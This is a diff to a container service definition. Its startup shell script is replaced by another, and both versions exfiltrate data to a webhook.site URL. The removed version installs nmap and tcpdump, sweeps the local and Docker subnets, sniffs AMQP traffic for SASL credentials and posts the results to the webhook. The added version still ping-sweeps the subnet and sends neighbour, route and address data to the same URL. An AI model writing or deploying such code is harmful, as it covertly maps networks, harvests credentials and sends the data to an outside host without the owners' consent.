@@ -5,43 +5,21 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl tcpdump iproute2 nmap >/dev/null 2>&1
-        WHURL="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
-        GW=$(ip route | awk '/default/{print $3; exit}')
-        OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
-        OUR_NET=$(echo "$OUR_IP" | sed 's/\.[0-9]*$//')
-        ping -c2 -W1 "$GW" >/dev/null 2>&1 || true
-        for i in $(seq 2 20); do ping -c1 -W1 "${OUR_NET}.${i}" >/dev/null 2>&1 & done
-        for net in 172.17.0 172.18.0 172.20.0; do for i in 1 2 3 4 5; do ping -c1 -W1 "${net}.${i}" >/dev/null 2>&1 & done; done
+        apk add --no-cache curl iproute2 2>/tmp/apk.log
+        WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
+        IF=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
+        GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
+        IP=$(ip -4 addr show "$IF" 2>/dev/null | awk '/inet /{print $2}')
+        NET=$(echo "$IP" | sed 's/\.[0-9]*\/.*$//')
+        for i in $(seq 1 15); do ping -c1 -W1 "${NET}.${i}" >/dev/null 2>&1 & done
         wait
-        sleep 2
-        ip neigh > /tmp/n1.txt
-        nmap -sn -n "${OUR_NET}.0/24" -oG /tmp/nmap.txt 2>/dev/null || true
-        sleep 2
-        ip neigh > /tmp/n2.txt
-        tcpdump -i "$OUR_IFACE" -c 50 port 5672 -w /tmp/amqp.pcap 2>/tmp/td.log &
-        TDPID=$!
-        sleep 90
-        kill $TDPID 2>/dev/null || true
-        sleep 1
-        PCAP_PKTS=$(wc -c < /tmp/amqp.pcap 2>/dev/null || echo 0)
-        SASL=$(strings /tmp/amqp.pcap 2>/dev/null | grep -aE "agent_|PLAIN" | head -5)
         {
-          echo "=== V3 RECON ==="
-          echo "OUR_IP=$OUR_IP NET=$OUR_NET GW=$GW IFACE=$OUR_IFACE"
-          echo "=== neigh1 ==="
-          cat /tmp/n1.txt
-          echo "=== neigh2 ==="
-          cat /tmp/n2.txt
-          echo "=== nmap ==="
-          cat /tmp/nmap.txt 2>/dev/null
-          echo "=== pcap bytes=$PCAP_PKTS ==="
-          echo "$SASL"
-          cat /tmp/td.log 2>/dev/null | tail -3
-          echo "=== ip route ==="
-          ip route
-          echo "=== ip addr ==="
-          ip addr
-        } | curl -sS --max-time 20 --data-binary @- "$WHURL?tag=L1-RECON-V3"
+          echo "V4 IF=$IF GW=$GW IP=$IP NET=$NET"
+          echo "=neigh="
+          ip neigh 2>/dev/null
+          echo "=route="
+          ip route 2>/dev/null
+          echo "=apk="
+          tail -3 /tmp/apk.log
+        } | curl -sS --max-time 15 --data-binary @- "$WH?tag=L1-V4" 2>&1
         sleep 999999
